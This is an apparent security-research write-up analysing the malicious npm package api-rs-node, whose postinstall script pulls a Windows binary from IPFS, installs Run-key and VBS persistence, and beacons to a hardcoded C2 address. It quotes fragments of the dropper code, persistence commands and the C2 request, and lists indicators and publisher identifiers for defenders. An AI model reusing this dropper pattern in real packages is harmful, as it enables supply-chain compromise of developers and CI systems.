---
title: "api-rs-node: a fake Rust bridge that doxxed its own author"
date: 2026-05-25
summary: "The npm package api-rs-node 4.3.1 advertises itself as a high-performance Rust bridge. Its postinstall pulls a Windows agent from IPFS, installs Run-key + VBS persistence, and beacons to 170.205.31.203:2026 — and the tarball quietly bundles the attacker's own config files."
packageName: api-rs-node
ecosystem: npm
---

A few hours after [system-user-identifier-cli](/discoveries/2026/05/system-user-identifier-cli/) was published from a throwaway gmail, a different gmail published `api-rs-node@4.3.1`. Same calendar day, different shape. The first package was 799 bytes and one stanza of bash; this one is a polished marketing README, a 292-line dropper, and a tarball that quietly carries the attacker's filesystem layout.

*An earlier draft of this same dropper, with the binary still bundled in the tarball, was published 5½ hours earlier as [`@devcarron/clob@2.73.0`](/discoveries/2026/05/devcarron-clob/) from a separate gmail. Same author, same payload — see that post for the comparison and the proof.*

## Stage 1: `clob.js`

The cover is a "Rust ↔ Node.js Bridge" README — feature list with emojis, benchmark table where pure JS loses by 7×, MIT License dated 2026, install instructions still reading `npm install your-package-name`. The `package.json` has no author, no license, no keywords, and one script:

<pre class="lang-js"><code>{
  <span class="tok-str">"name"</span>: <span class="tok-str">"api-rs-node"</span>,
  <span class="tok-str">"version"</span>: <span class="tok-str">"4.3.1"</span>,
  <span class="tok-str">"description"</span>: <span class="tok-str">"High-performance Rust modules for Node.js with native speed and clean DX."</span>,
  <span class="tok-str">"scripts"</span>: { <span class="tok-str">"postinstall"</span>: <span class="tok-str">"node clob.js"</span> },
  <span class="tok-str">"main"</span>: <span class="tok-str">"clob.js"</span>
}
</code></pre>

`clob.js` is wired for Windows only — `MAC_URL` and `LINUX_URL` are still `null` with `TODO` comments:

<pre class="lang-js"><code><span class="tok-kw">const</span> WIN_CID   = <span class="tok-str">'bafybeif3zkapj364ofnrvbty7oj5h5ufpxlp4s62usk3ulxrru35e3gssa'</span>;
<span class="tok-kw">const</span> MAC_URL   = <span class="tok-kw">null</span>; <span class="tok-com">// TODO: set macOS binary URL</span>
<span class="tok-kw">const</span> LINUX_URL = <span class="tok-kw">null</span>; <span class="tok-com">// TODO: set Linux binary URL</span>
</code></pre>

The dropper tries four IPFS gateways for `WIN_CID` in sequence, then writes the result to `%LOCALAPPDATA%\windows defender host.exe`:

- `violet-tricky-quelea-562.mypinata.cloud` (private Pinata, optional `PINATA_GATEWAY_TOKEN`)
- `cloudflare-ipfs.com`
- `gateway.pinata.cloud`
- `ipfs.io`

Persistence is wired for all three platforms even though only Windows downloads anything:

- **Windows:** hidden VBS launcher (`oShell.Run "...exe", 0, False`) + `HKCU\…\Run`
- **macOS:** `~/Library/LaunchAgents/com.clob.agent.plist` with `RunAtLoad=true`
- **Linux:** `~/.config/autostart/clob.desktop`

The mac and linux branches register persistence and bail when their URLs are still null. After the binary lands the script asks `api.ipify.org` for the host's public IP and POSTs it to a hardcoded IPv4 on a port that doubles as the year:

<pre class="lang-js"><code><span class="tok-kw">const</span> reportPath = <span class="tok-tmpl">`/api/urls?url=<span class="tok-tmpl-expr">${encodeURIComponent(ip)}</span>`</span>;
<span class="tok-kw">const</span> options = {
  hostname: <span class="tok-str">'170.205.31.203'</span>,
  port: 2026,
  path: reportPath,
  method: <span class="tok-str">'POST'</span>,
};
</code></pre>

The launcher is the standard hidden-spawn recipe and every failure path swallows the error:

- Spawn options: `detached: true`, `stdio: 'ignore'`, `windowsHide: true`, `child.unref()`
- Failed download: silent `fs.unlink` on the partial file
- Timed-out install: `process.exit(0)` with no log
- Every catch block: `catch (_) {}`

A Windows campaign that intends to grow.

## The leak

The tarball is seven files, not two: alongside `clob.js`, `package.json`, and the README sit a `config/` directory with two JSON files and a `logs/` directory with two empty log files, none referenced by the code. `config/meta_data.json` is the surprise:

<pre><code>{
  "version": "0.2.3",
  "abs_file_path_buf": "E:\\getting IP and check list\\clob-downloader\\config\\meta_data.json",
  "abs_folder_path_buf_for_templates": "E:\\getting IP and check list\\clob-downloader\\config\\templates",
  "all_volumes_with_information": [
    { "mount_point": "C:\\", "size": 317725863936, "total_read_bytes": 423897711616, ... },
    { "volume_name": "Programs", "mount_point": "D:\\", ... },
    { "volume_name": "Data",     "mount_point": "E:\\", ... },
    { "volume_name": "Etc",      "mount_point": "F:\\", ... }
  ],
  "current_running_os": "windows",
  "current_cpu_architecture": "x86_64",
  "user_home_dir": "C:\\Users\\mist"
}
</code></pre>

These files come from the author's own file-explorer scaffolding (`0.2.3` is that tool's version) — when they ran `npm publish` from `E:\getting IP and check list\clob-downloader\`, the tool's bookkeeping went with it. The bundle records the project's working name (`clob-downloader`, inside a directory literally named `getting IP and check list`), the Windows username `mist`, the four-volume NTFS layout, and lifetime read/write byte totals per volume — a fingerprint that survives reformats less than a serial number but more than an IP. The dropper was written carefully — section dividers, redirect handling, abortable promises, a 15-second install timeout — but the packaging was not.

## Stage 2: what the CID serves

The CID resolves to a 4 MB Windows PE32+. The PDB path was not stripped:

| Field | Value |
| --- | --- |
| SHA-256 | [`300a7dea05c2a588757010ad314fa55cb8ef3acebaa284f58a5cd0fd39bce478`](https://lab.atomdrift.org/file/300a7dea05c2a588757010ad314fa55cb8ef3acebaa284f58a5cd0fd39bce478) |
| PDB | `explr_server.pdb` |
| PDB GUID | `cd195463-cbd6-4917-a75d-49b312738bda` |
| Build timestamp | `2026-05-25T08:28:35Z` (nine hours before the tarball) |
| Toolchain | MSVC 14.44, no packer, full Rust crate paths in place |

The binary is a complete Tauri-style desktop application — an Axum + Hyper + Tokio HTTP server with a React/JS file-explorer UI baked into `.rdata`:

| Field | Value |
| --- | --- |
| Startup banner | `Explr web server listening on http://…` |
| Routes | `/api/invoke` and `/api/download` |
| Auth | `Authorization: Bearer …` |
| Required env vars | `HOST`, `PORT`, `EXPLR_UI`, `AUTH_TOKEN` |
| Missing-config behaviour | errors `Invalid HOST/PORT` and exits before binding |

The Tauri `invoke` surface enumerates to 53 commands. Most are filesystem and config operations; four are execution endpoints that make remote shell a first-class feature:

- `execute_command`
- `execute_command_improved`
- `execute_command_with_timeout`
- `request_full_disk_access`

The bundled `config/` files in the tarball are this same application's own metadata; the cover identity is internally consistent.

Nothing in the binary indicates a stealer. Every indicator a stealer would carry is absent:

- Browser creds: `Login Data`, `Cookies.db`, `key3.db`, `Local State`, `logins.json`, `nss3.dll`
- Wallets / seeds: MetaMask, Phantom, Exodus, Atomic, Electrum, `wallet.dat`, mnemonic dictionaries
- Tokens: Discord, Telegram
- DPAPI: `CryptUnprotectData`

cleave fires three substring false positives on the React UI:

- `credential-access/browser/dpapi` on `v11` — a UI version string, not the DPAPI marker
- `collection/file-targeting/filter` on `.seed` from a MIME table
- `exfiltration/stealer/file` on `FindFirstVolumeW`, used to populate the drive sidebar

The only traits that survive review are the Tauri surface itself:

|  | Trait | What it caught |
| --- | --- | --- |
| <span class="sev-dot suspicious" title="suspicious"></span> | `command-and-control/backdoor/control/file-manager` | Tauri `*_sftp` + `execute_command*` exposed over HTTP |
| <span class="sev-dot suspicious" title="suspicious"></span> | `discovery/system/fingerprint/info` | `GetSystemInfo`, drive and volume enumeration |

## The campaign does not close the loop

For an engineer triaging this: as shipped, the chain between dropper and binary does not actually connect.

1. **Windows-only.** The macOS and Linux branches in `clob.js` carry `MAC_URL = null` and `LINUX_URL = null` and exit before downloading anything. The launchd plist and XDG autostart code is written and unreachable.
2. **No environment handoff.** Neither `spawn(exePath, [], { detached: true, stdio: 'ignore' })` nor the Run-key value `wscript.exe //nologo "<vbsPath>"` propagates `HOST`, `PORT`, `EXPLR_UI`, or `AUTH_TOKEN`. The server hits its `Invalid HOST/PORT` path on every launch and exits. Persistence survives; the listener does not.
3. **NAT assumption.** `clob.js` POSTs the host's public IP from `api.ipify.org` to `170.205.31.203:2026` with a literal `:80` suffix. For any host behind NAT — every developer workstation and every hosted CI runner — that address belongs to the edge router, not the box that ran `npm install`. There is nothing for C2 to connect back to.

The realistic victim is a Windows host directly addressable on the public internet, with those four environment variables exported in the user's session, with nothing on `http.sys` already holding port 80, running `npm install api-rs-node`. That population is approximately empty. Two of the three gaps are coding bugs; the third is a design assumption the author has not reckoned with. The package is worth detecting and blocking, but no installed host as currently shipped ends up with a working backdoor.

## Why this works

The execution surface is `postinstall`, which scanners do flag — but `clob.js` is structured like a normal native-module bootstrapper that downloads a prebuilt binary for the user's platform, which is what `node-pre-gyp`, `prebuild-install`, and dozens of legitimate packages do at install time. The malicious version doesn't need to look different; the binary just has to be the payload.

IPFS staging is what makes delivery hard to disrupt. The CID is a content hash, so whoever holds the underlying bytes can serve them from any gateway; taking down the Pinata project removes one path while the bytes remain pinned wherever the actor or any sympathetic peer keeps them, and `ipfs.io` will happily proxy them. There is no single domain to seize.

The `TODO`s and the leaked dev-env both say the same thing: this is iteration, not a finished campaign. `4.3.0` published at 17:36 UTC, `4.3.1` ninety minutes later — long enough to test, short enough to be the same sitting.

## Dropper traits

The [Fallout report](https://lab.atomdrift.org/file/75a602995eeebbeee9c0af1e6e83f2384d5426cb64af78f4475f261add329410) returns malicious at probability 1.0. The [cleave-traits](https://codeberg.org/atomdrift/cleave-traits) cluster around four behaviours: IPFS delivery, stealth spawn, multi-platform persistence, and the Windows Defender masquerade.

|  | Trait | What it caught |
| --- | --- | --- |
| <span class="sev-dot hostile" title="hostile"></span> | `command-and-control/dropper/delivery/blockchain` | Four IPFS gateways fronting one CID |
| <span class="sev-dot hostile" title="hostile"></span> | `command-and-control/dropper/execution/persistence` | Download → Run key + LaunchAgents + XDG autostart |
| <span class="sev-dot hostile" title="hostile"></span> | `command-and-control/dropper/execution/stealth-spawn` | `detached:true` + `stdio:'ignore'` + `windowsHide:true` + `unref()` co-located |
| <span class="sev-dot hostile" title="hostile"></span> | `evasion/masquerade/identity/fabricated` | Drops as `windows defender host.exe` |
| <span class="sev-dot suspicious" title="suspicious"></span> | `command-and-control/channel/http-beacon` | `POST /api/urls?url=<ip>` to `170.205.31.203:2026` |
| <span class="sev-dot suspicious" title="suspicious"></span> | `command-and-control/infrastructure/ip-port` | Hardcoded IPv4 endpoint, no DNS |
| <span class="sev-dot suspicious" title="suspicious"></span> | `evasion/self-delete/file/script` | `fs.unlink(dest, () => {})` on every failure path |
| <span class="sev-dot suspicious" title="suspicious"></span> | `evasion/masquerade/identity/user-agent` | Chrome 124 UA in dropper requests |
| <span class="sev-dot suspicious" title="suspicious"></span> | `persistence/system/launchd/core` | LaunchAgents plist with `RunAtLoad` |
| <span class="sev-dot suspicious" title="suspicious"></span> | `persistence/system/init/boot` | `~/.config/autostart/clob.desktop` |
| <span class="sev-dot notable" title="notable"></span> | `persistence/login/registry/autostart` | `HKCU\…\Run` with VBS launcher |

The reverse-shell pattern from the prior post is absent. What cleave flags here is *bootstrap that should not be one*: a manifest with no metadata invoking a 292-line postinstall script that downloads a platform-specific binary from IPFS and registers it for autostart.

## Impact

`postinstall` runs whenever the package is installed — by a developer typing `npm i api-rs-node`, by CI installing transitively, by anything resolving a lockfile that includes it. The Windows branch drops `windows defender host.exe` into `%LOCALAPPDATA%`, registers it under HKCU Run via a hidden VBS launcher, spawns it detached, and beacons the host's public IP to `170.205.31.203:2026`. The dropped binary is whatever the actor pinned at the CID at the time — content-addressed, but the content is the actor's to choose. The mac and linux branches abort early today; tomorrow they may not.

## Likely actor

Two versions in ninety minutes from one fresh gmail; an earlier draft ([`@devcarron/clob@2.73.0`](/discoveries/2026/05/devcarron-clob/)) was published 5½ hours before `4.3.0` from a *different* fresh gmail. The two accounts publish from the same Windows machine — the bundled `meta_data.json` is byte-identical across both packages, naming the same four-volume NTFS drive layout and the same username (`mist`).

| Field | Value |
| --- | --- |
| Publisher | `shinydv412 <shinydv412@gmail.com>` |
| `4.3.0` published | `2026-05-25T17:36:29Z` |
| `4.3.1` published | `2026-05-25T19:05:48Z` |
| Files in tarball | 7 (`clob.js`, `package.json`, `README.md`, `config/×2`, `logs/×2`) |
| Sibling publisher | `devcarron <devcarron@gmail.com>` (`@devcarron/clob@2.73.0`, `2026-05-25T11:59:04Z`) |
| Author host (from bundled `meta_data.json`) | Windows x86_64, username `mist`, project dir `E:\getting IP and check list\clob-downloader` |

Higher craftsmanship than the prior post — section comments, redirect handling, multi-gateway fallback, three-platform persistence wiring — paired with novice OPSEC: the package ships the author's machine fingerprint, the tooling version, the working name of their project, and even their lifetime per-volume disk read/write totals. The Pinata CID, the `2026` port, the unfinished `*_URL` constants, and the unpolished README all read as one person's second iteration on a stager they intend to refine. The first iteration — `@devcarron/clob` — was louder, bundled the binary, and made the same NAT and env-var mistakes; the refinements between the two are visible. The dropper is more dangerous than `system-user-identifier-cli`'s reverse shell — quieter, persistent, content-addressed — and the author is more careless than the one who shipped the shell.

## Indicators

| Type | Value |
| --- | --- |
| Package | `api-rs-node@4.3.1` (npm), also `4.3.0` |
| npm page | [npmjs.com/package/api-rs-node](https://www.npmjs.com/package/api-rs-node) |
| Tarball SHA-256 | [`75a602995eeebbeee9c0af1e6e83f2384d5426cb64af78f4475f261add329410`](https://lab.atomdrift.org/file/75a602995eeebbeee9c0af1e6e83f2384d5426cb64af78f4475f261add329410) |
| `clob.js` SHA-256 | [`5839ea1afa6dc1237da3a9c59668b1e4e21e5dde2d2827daecf43a83400a7023`](https://lab.atomdrift.org/file/5839ea1afa6dc1237da3a9c59668b1e4e21e5dde2d2827daecf43a83400a7023) |
| `package.json` SHA-256 | [`00ec02844d57931db3abb8011ecc9aba3fa7165c701c7a60065e1d63abe53c44`](https://lab.atomdrift.org/file/00ec02844d57931db3abb8011ecc9aba3fa7165c701c7a60065e1d63abe53c44) |
| C2 endpoint | `170.205.31.203:2026` (HTTP `POST /api/urls?url=<public-ip>:80`) |
| IPFS payload CID | `bafybeif3zkapj364ofnrvbty7oj5h5ufpxlp4s62usk3ulxrru35e3gssa` |
| Private gateway | `violet-tricky-quelea-562.mypinata.cloud` |
| Public-IP lookup | `api.ipify.org` |
| Dropped Windows file | `%LOCALAPPDATA%\windows defender host.exe` |
| Run key | `HKCU\Software\Microsoft\Windows\CurrentVersion\Run\clob` |
| Windows launcher | `%LOCALAPPDATA%\windows defender host-launcher.vbs` |
| macOS plist | `~/Library/LaunchAgents/com.clob.agent.plist` |
| Linux autostart | `~/.config/autostart/clob.desktop` |
| Publisher | `shinydv412 <shinydv412@gmail.com>` |

## Response

Search npm caches, CI logs, and `%LOCALAPPDATA%` (and the mac/linux paths above) for the dropped filenames. In egress telemetry: outbound to `170.205.31.203:2026`, to `api.ipify.org`, and to the four IPFS gateways above carrying that CID. Rotate any credentials available to a user that ran `npm install` on a Windows host that resolved `api-rs-node` since 2026-05-25. Treat the binary at the CID as untrusted; pull it for analysis from a host that does not share an identity with anything else you care about.

The full trait list and raw analysis live in the [Fallout report](https://lab.atomdrift.org/file/75a602995eeebbeee9c0af1e6e83f2384d5426cb64af78f4475f261add329410); registry metadata came from `https://registry.npmjs.org/api-rs-node` and the source from the published tarball.
